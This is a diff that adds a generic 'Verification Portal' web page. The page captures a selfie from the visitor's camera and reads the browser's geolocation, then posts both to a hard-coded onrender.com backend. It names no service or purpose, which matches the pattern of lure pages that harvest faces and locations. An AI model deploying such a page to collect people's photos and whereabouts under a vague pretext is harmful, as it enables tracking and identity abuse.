@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Verification Portal</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 40px; }
+    video { width: 300px; border: 1px solid #ccc; margin-bottom: 10px; }
+    button { margin: 10px; padding: 10px 20px; font-size: 16px; }
+  </style>
+</head>
+<body>
+  <h2>Identity & Location Verification</h2>
+  <p>Please allow access to your camera and location for verification.</p>
+
+  <video id="video" autoplay playsinline></video><br>
+  <button id="capture">Capture Photo</button>
+  <canvas id="canvas" style="display:none;"></canvas><br>
+  <button id="send">Send Data</button>
+
+  <script>
+    let photoData = "";
+
+    // Start camera
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        document.getElementById('video').srcObject = stream;
+      })
+      .catch(err => alert("Camera access denied: " + err));
+
+    // Capture photo
+    document.getElementById('capture').onclick = () => {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      photoData = canvas.toDataURL("image/png");
+      alert("Photo captured!");
+    };
+
+    // Send photo + location to backend
+    document.getElementById('send').onclick = () => {
+      if (!photoData) {
+        alert("Please capture a photo first!");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
+
+        // Replace with your Render backend URL
+        const backendURL = "https://backend-project-2-hwfa.onrender.com";
+
+        // Send photo
+        fetch(`${backendURL}/upload`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ photo: photoData })
+        }).then(() => console.log("Photo sent"));
+
+        // Send location
+        fetch(`${backendURL}/location`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude: lat, longitude: lng })
+        }).then(() => console.log("Location sent"));
+
+        alert("Data sent to backend!");
+      }, err => alert("Location access denied: " + err));
+    };
+  </script>
+</body>
+</html>
